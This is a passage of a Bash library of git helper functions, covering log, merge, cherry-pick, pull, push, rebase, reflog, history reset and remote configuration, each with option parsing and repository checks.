    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ -n "${file_path}" ]; then
        file_path="--follow -- \"${file_path}\""
    fi

    if [ -z "${branch}" ]; then
        branch=HEAD
    else
        revision_range="${branch}"
    fi

    if [ -n "${commit_hash}" ]; then
        # when commit hash is given range includes commit
        revision_range="${branch} ^${commit_hash}~1"
    fi

    if [ "${number}" -gt 0 ]; then
        if [ "${branch}" = HEAD ]; then
            revision_range="-${number}"
        else
            revision_range="${branch} -${number}"
        fi
    fi

    if [ -n "${commit_hash}" ] || [ -n "${number}" ]; then
        graph=''
        pager='--no-pager'
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "$(echo "git ${pager} log ${revision_range} ${author} ${stats} ${graph} ${no_decorate} ${no_summary} ${oneline} ${patch} ${file_path}" | tr -s ' ')\n"
    eval "git ${pager} log ${revision_range} ${author} ${stats} ${graph} ${no_decorate} ${no_summary} ${oneline} ${patch} ${file_path}"
}

## Print origin settings
function lremote() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'git remote -v\n'
    git remote -v
}

## Merge git branch into current branch
function merge() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'merge (branch) [-m message] -a (abort) -c (continue) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local abort=false
    local branch
    local continue=false
    local message

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :acm:h option; do
            case "${option}" in
                a) abort=true;;
                c) continue=true;;
                m) message="${OPTARG}";;
                h) _echo_warning 'merge\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Merge git branch into current branch\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    # "abort" and "continue" commands do not require argument
    if [ "${abort}" = true ] || [ "${continue}" = true ]; then
        if [ "${#arguments[@]}" -gt 1 ]; then
            _echo_danger "error: too many arguments (${#arguments[@]})\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    # set default message
    message=$(date '+%Y-%m-%d %H:%M:%S')

    #--------------------------------------------------
    # Execute short commands
    #--------------------------------------------------

    if [ "${abort}" = true ]; then
        _echo_info 'git merge --abort\n'
        git merge --abort
        return 0
    fi

    #--------------------------------------------------

    if [ "${continue}" = true ]; then
        _echo_info 'git merge --continue\n'
        git merge --continue
        return 0
    fi

    #--------------------------------------------------

    gstatus -v

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    branch="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # select local branches with options when variable empty
    if [ -z "${branch}" ]; then
        _echo_info 'git --no-pager branch --format="%(refname:short)"\n'
        branch="$(_pick_branch)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "git merge ${branch} -m \"${message}\"\n"
    git merge "${branch}" -m "${message}"
}

alias iopen='open-commit-files-in-ide' ## open-commit-files-in-ide alias

## Open modified/conflicting files in ide
function open-commit-files-in-ide() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'open-commit-files-in-ide (branch_name/commit_hash) -F [file type filter] -i [ide] -n [number] -B (pick branch) -C (pick commit)  -I (pick ide) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local commit_hash
    local files
    local filter
    local ide
    local number
    local object
    local pick_branch=false
    local pick_commit=false
    local select_ide=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789BCF:i:In:vh option; do
            case "${option}" in
                [0-9]) number="${option}";;
                B) pick_branch=true;;
                C) pick_commit=true;;
                F) filter="${OPTARG}";;
                i) ide="${OPTARG}";;
                I) select_ide=true;;
                n) number="${OPTARG}";;
                v) verbose=true;;
                h) _echo_warning 'open-commit-files-in-ide\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Open modified/conflicting files in ide\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Check handler installation
    #--------------------------------------------------

    if [ ! -x "$(command -v phpstorm-url-handler)" ]; then
        _echo_danger 'error: ide-url-handler required, visit: "https://github.com/TangoMan75/ide-url-handler" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate and get arguments
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = true ]; then
            branch="${arguments[${LBOUND}]}"

        elif [ "$(_commit_exists "${object}")" = true ]; then
            commit_hash="${arguments[${LBOUND}]}"

        else
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Build `show -l` command
    #--------------------------------------------------

    # Open diff when no commit given
    if [ -z "${commit_hash}" ] && [ -z "${number}" ]; then
        if [ -n "$(gdiff -l)" ]; then
            command='gdiff -l'
        fi
    fi

    if [ -z "${command}" ]; then
        command='show -l'

        if [ -n "${branch}" ]; then
            command="${command} ${branch}"

        elif [ -n "${commit_hash}" ]; then
            command="${command} ${commit_hash}"
        fi

        if [ -n "${number}" ]; then
            command="${command} -n ${number}"
        fi

        if [ -n "${filter}" ]; then
            command="${command} -F \"${filter}\""
        fi

        if [ "${pick_commit}" = true ]; then
            command="${command} -C"
        fi

        if [ "${pick_branch}" = true ]; then
            command="${command} -B"
        fi
    fi

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi
    files=$(eval "${command}" | tr -s "\n" ' ')

    #--------------------------------------------------
    # Build `open-in-ide` command
    #--------------------------------------------------

    if [ "${select_ide}" = true ]; then
        command="open-in-ide -I ${files}"
    elif [ -n "${ide}" ]; then
        command="open-in-ide -i ${ide} ${files}"
    else
        command="open-in-ide ${files}"
    fi

    #--------------------------------------------------
    # Execute commands
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi
    eval "${command}"
}

## Apply a commit from another branch
function pick() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'pick (commit_hash) -n (no-commit) -a (abort) -c (continue) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local abort=false
    local branch
    local commit_hash
    local continue=false
    local no_commit=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :acnh option; do
            case "${option}" in
                a) abort=true;;
                c) continue=true;;
                n) no_commit=true;;
                h) _echo_warning 'pick\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Apply a commit from another branch\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute short commands
    #--------------------------------------------------

    if [ "${abort}" = true ]; then
        _echo_info 'git cherry-pick --abort\n'
        git cherry-pick --abort
        return 0
    fi

    if [ "${continue}" = true ]; then
        _echo_info 'git cherry-pick --continue\n'
        git cherry-pick --continue
        return 0
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # hash is the only accepted argument
    commit_hash="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # select commit hash when empty
    if [ -z "${commit_hash}" ]; then
        _echo_info 'git --no-pager branch --format="%(refname:short)"\n'
        branch="$(_pick_branch -m)"
        # shellcheck disable=2181
        if [ $? != 0 ]; then
            return 1
        fi

        _echo_info "git --no-pager log ${branch} --no-decorate --oneline -n 16\n"
        commit_hash="$(_pick_commit "${branch}")"
        # shellcheck disable=2181
        if [ $? != 0 ]; then
            return 1
        fi
    fi

    #--------------------------------------------------
    # Validate argument value
    #--------------------------------------------------

    if [ "$(_commit_exists "${commit_hash}")" = false ]; then
        _echo_danger "error: Invalid commit : \"${commit_hash}\"\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${no_commit}" = true ]; then
        _echo_info "git cherry-pick --no-commit ${commit_hash}\n"
        git cherry-pick --no-commit "${commit_hash}"
    else
        _echo_info "git cherry-pick ${commit_hash}\n"
        git cherry-pick "${commit_hash}"
    fi

    #--------------------------------------------------

    echo
    gstatus -v
}

## Pull git history from remote repository
function pull() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'pull -f (force) -r recursive -h (help)\n'
    }

    function _pull() {
        #--------------------------------------------------
        # check git directory
        #--------------------------------------------------

        if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
            _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
            return 1
        fi

        #--------------------------------------------------

        gstatus -v

        #--------------------------------------------------

        if [ "${force}" = true ]; then
            _echo_info 'git pull --allow-unrelated-histories\n'
            git pull --allow-unrelated-histories
        else
            _echo_info 'git pull\n'
            git pull
        fi

        #--------------------------------------------------

        echo
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local force=false
    local recursive=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :frh option; do
        case "${option}" in
            f) force=true;;
            r) recursive=true;;
            h) _echo_warning 'pull\n';
                _echo_success 'description:' 2 14; _echo_primary 'Pull git history from remote repository\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${recursive}" = true ]; then
        find . -mindepth 1 -type d -name '.git' | sort | while read -r folder_path
        do
            (
                _echo_info "cd \"$(dirname "$(realpath "${folder_path}")")\" || true\n"
                cd "$(dirname "$(realpath "${folder_path}")")" || true

                _pull "${folder_path}"
            )
        done
    else
        _pull
    fi
}

## Update remote git repository
function push() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'push (message) -a (commit_all) -f (force) -t (tags) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local commit=false
    local current_branch
    local force=false
    local message
    local set_upstream
    local tags=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :afth option; do
            case "${option}" in
                a) commit=true;;
                f) force=true;;
                t) tags=true;;
                h) _echo_warning 'push\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Update remote git repository\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # message is the only valid argument
    if [ "${#arguments[@]}" -eq 0 ]; then
        emojis=(☕ ⚡ ✌ ✨ ⭐ 🌟 🌶 🍩 🍬 🍭 🍰 🎉 🎊 🎯 🎷 🎸 🎺 🏁 🏅 🏆 🐀 🐁 🐄 🐅 🐇 🐈 🐕 🐝 🐠 🐧 🐰 🐱 🐼 👋 👍 👑 💙 💡 🔥 🚀 🛸 🤖 🤟 🥇 🦄 🦖)
        message="${emojis[ $((RANDOM % ${#emojis[@]})) ]} $(date '+%Y-%m-%d %H:%M:%S')"
    else
        message="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    guser
    echo
    lremote
    branch -l

    #--------------------------------------------------

    # no pull when forcing push (overwriting)
    if [ "${force}" = false ]; then
        _echo_info 'git pull\n'
        git pull
        echo
    fi

    #--------------------------------------------------

    # only when we have changes and commit = true
    if [ -n "$(git status -s)" ] && [ "${commit}" = true ]; then
        _echo_info 'git add .\n'
        git add .
        echo

        gstatus

        _echo_info "git commit -m \"${message}\"\n"
        git commit -m "${message}"
        echo
    else
        gstatus
    fi

    #--------------------------------------------------

    current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"

    # if upstream is not set or remote branch doesn't exist
    if [ -z "$(git rev-parse --abbrev-ref --symbolic-full-name '@{u}' 2>/dev/null)" ] || [ -z "$(git --no-pager branch --list -r "origin/${current_branch}")" ]; then
        set_upstream="--set-upstream origin \"${current_branch}\""
    fi

    if [ "${force}" = true ]; then
        force='--force '
    else
        force=''
    fi

    _echo_info "$(echo "git push ${force}${set_upstream}" | tr -s ' ')\n"
    eval "git push ${force}${set_upstream}"

    if [ "${tags}" = true ]; then
        _echo_info 'git push --tags\n'
        git push --tags
    fi
}

## Reorganize local commit history
function rebase() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'rebase (branch_name/commit_hash) -n [number] -a (abort) -c (continue) -s (self) -r (from root) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local abort=false
    local branch
    local commit_hash
    local continue=false
    local max_arguments=1
    local number
    local object
    local root=false
    local self=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789acn:rsh option; do
            case "${option}" in
                [1-9]) number="${option}";self=true;;
                a) abort=true;;
                c) continue=true;;
                n) number="${OPTARG}";self=true;;
                r) root=true;;
                s) self=true;;
                h) _echo_warning 'rebase\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Reorganize local commit history\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    # "abort", "continue" and "root" commands do not require argument
    if [ "${abort}" = true ] || [ "${continue}" = true ] || [ "${root}" = true ]; then
        max_arguments=0
    fi

    if [ "${#arguments[@]}" -gt "${max_arguments}" ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute short commands
    #--------------------------------------------------

    if [ "${abort}" = true ]; then
        _echo_info 'git rebase --abort\n'
        git rebase --abort
        return 0
    fi

    #--------------------------------------------------

    if [ "${continue}" = true ]; then
        _echo_info 'git rebase --continue\n'
        git rebase --continue
        return 0
    fi

    #--------------------------------------------------

    if [ "${root}" = true ]; then
        _echo_info 'git rebase --interactive --root\n'
        git rebase --interactive --root
        return 0
    fi

    #--------------------------------------------------
    # Validate and get arguments
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = true ]; then
            branch="${arguments[${LBOUND}]}"

        elif [ "$(_commit_exists "${object}")" = true ]; then
            commit_hash="${arguments[${LBOUND}]}"

        else
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -n "${commit_hash}" ]; then
        self=true
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    if [ "${self}" = false ] && [ -z "${branch}" ]; then
        branch="$(_pick_branch -m)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    if [ "${self}" = true ] && [ -z "${commit_hash}" ] && [ -z "${number}" ]; then
        commit_hash=$(_pick_commit)
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -z "${commit_hash}" ]; then
        commit_hash=HEAD
    fi

    if [ -z "${number}" ]; then
        commit_hash="${commit_hash}~1"
    else
        commit_hash="${commit_hash}~$((number))"
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${self}" = true ]; then
        _echo_info "git rebase --interactive ${commit_hash}\n"
        git rebase --interactive "${commit_hash}"
        return 0
    fi

    _echo_info "git rebase --interactive ${branch}\n"
    git rebase --interactive "${branch}"
}

## Execute git reflog
function reflog() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'reflog -a (all branches) -c (clear unreachable) -C (clear expired and unreachable) -d (dry-run) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local all=false
    local clear=false
    local dry_run=false
    local expired

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :acCdh option; do
        case "${option}" in
            a) all=true;;
            c) clear=true;;
            C) clear=true;expired=' --expire=now';;
            d) dry_run=true;;
            h) _echo_warning 'reflog\n';
                _echo_success 'description:' 2 14; _echo_primary 'Execute git reflog\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${clear}" = false ]; then
        if [ "${all}" = true ]; then
            _echo_info "git --no-pager reflog show --all\n"
            git --no-pager reflog show --all
        else
            _echo_info "git --no-pager reflog show\n"
            git --no-pager reflog show
        fi
    fi

    if [ "${clear}" = true ]; then
        _echo_info "git reflog expire --expire-unreachable=now${expired} --all --dry-run\n"
        eval "git reflog expire --expire-unreachable=now ${expired} --all --dry-run"
    fi

    if [ "${clear}" = true ] && [ "${dry_run}" = false ]; then
        _echo_info "git reflog expire --expire-unreachable=now${expired} --all\n"
        eval "git reflog expire --expire-unreachable=now ${expired} --all"
    fi
}

## Reset current git history
function reinit() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'reinit -f (force remote) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local count
    local force=false
    local index
    local submodule_path
    local temp

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :fh option; do
        case "${option}" in
            f) force=true;;
            h) _echo_warning 'reinit\n';
                _echo_success 'description:' 2 14; _echo_primary 'Reset current git history\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info "cd \"$(git rev-parse --show-toplevel 2>/dev/null)\" || return 1\n"
    cd "$(git rev-parse --show-toplevel 2>/dev/null)" || return 1

    #--------------------------------------------------

    # generate temp folder
    temp="$(mktemp -d)"

    #--------------------------------------------------
    # backup git config
    #--------------------------------------------------

    _echo_info "mv .git \"${temp}/.git\"\n"
    mv .git "${temp}/.git"

    #--------------------------------------------------
    # remove submodules
    #--------------------------------------------------

    if [ -f .gitmodules ]; then
        awk '/^(\t| )+path = .+/ {print $3}' .gitmodules | while IFS= read -r submodule_path
        do
            _echo_info "rm -rf \"./${submodule_path}\"\n"
            rm -rf "./${submodule_path}"
        done
    fi

    #--------------------------------------------------
    # backup .gitmodules
    #--------------------------------------------------

    if [ -f .gitmodules ]; then
        _echo_info "mv .gitmodules \"${temp}/.gitmodules\"\n"
        mv .gitmodules "${temp}/.gitmodules"
    fi

    #--------------------------------------------------
    # initialize local git repository
    #--------------------------------------------------

    _echo_info 'git init\n'
    git init

    #--------------------------------------------------
    # restore git config
    #--------------------------------------------------

    _echo_info "cp \"${temp}/.git/config\" .git/config\n"
    cp "${temp}/.git/config" .git/config

    #--------------------------------------------------
    # restore git hooks
    #--------------------------------------------------

    _echo_info "cp -r \"${temp}/.git/hooks\" .git/\n"
    cp -r "${temp}/.git/hooks" .git/

    #--------------------------------------------------
    # update submodules
    #--------------------------------------------------

    if [ -f "${temp}/.gitmodules" ]; then
        # count modules
        count=$(awk '/^\[submodule ".+"\]$/ {x+=1} END {print x}' "${temp}/.gitmodules")
        _echo_info "Found \"${count}\" gitmodules\n"

        for (( index=1; index<=count; index++ )); do
            # get url for current index
            URL=$(awk -v INDEX="${index}" '/^\[submodule ".+"\]$/ {i+=1} /^(\t| )+url = .+/ { if (i==INDEX) print $3}' "${temp}/.gitmodules")
            _echo_info "${URL}\n"

            # get path for current index
            submodule_path=$(awk -v INDEX="${index}" '/^\[submodule ".+"\]$/ {i+=1} /^(\t| )+path = .+/ { if (i==INDEX) print $3}' "${temp}/.gitmodules")
            _echo_info "${submodule_path}\n"

            _echo_info "git submodule add \"${URL}\" \"${submodule_path}\"\n"
            git submodule add "${URL}" "${submodule_path}"
        done
    fi

    #--------------------------------------------------

    _echo_info 'git add .\n'
    git add .

    #--------------------------------------------------

    _echo_info 'git commit -m "🎉 Initial Commit"\n'
    git commit -m "🎉 Initial Commit"

    #--------------------------------------------------

    if [ "${force}" = true ]; then
        _echo_warning 'Resetting remote repository\n'

        _echo_info 'tag -D\n'
        tag -D

        _echo_info 'git push --force --set-upstream origin master\n'
        git push --force --set-upstream origin master
    fi

    #--------------------------------------------------

    echo
    gstatus -v
}

## Set / print local git repository server configuration
function remote() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'remote (repository) [-s server] [-u username] -b (bitbucket) -g (github) -l (gitlab) -H (https) -S (ssh) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command
    local git_repository
    local git_server
    local git_ssh
    local git_username
    local print=true

    #--------------------------------------------------

    # git remote default mode is "add origin"
    # you get "fatal: remote origin already exists" when adding remote twice
    command='add'

    if [ -n "$(git remote get-url origin 2>/dev/null)" ]; then
        command='set-url'
        # get default configuration from "git remote"
        git_server=$(git remote get-url origin | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f1)
        git_username=$(git remote get-url origin | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f2)
        git_repository=$(git remote get-url origin | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f3)

        # get ssh config
        if git remote get-url origin | grep -q -o 'git@'; then
            git_ssh=true
        fi
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :s:u:bglHSh option; do
            case "${option}" in
                s) git_server="${OPTARG}"; print=false;;
                u) git_username="${OPTARG}"; print=false;;
                b) git_server='bitbucket.org'; print=false;;
                g) git_server='github.com'; print=false;;
                l) git_server='gitlab.com'; print=false;;
                H) git_ssh=false; print=false;;
                S) git_ssh=true; print=false;;
                h) _echo_warning 'remote\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Set / print local git repository configuration\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
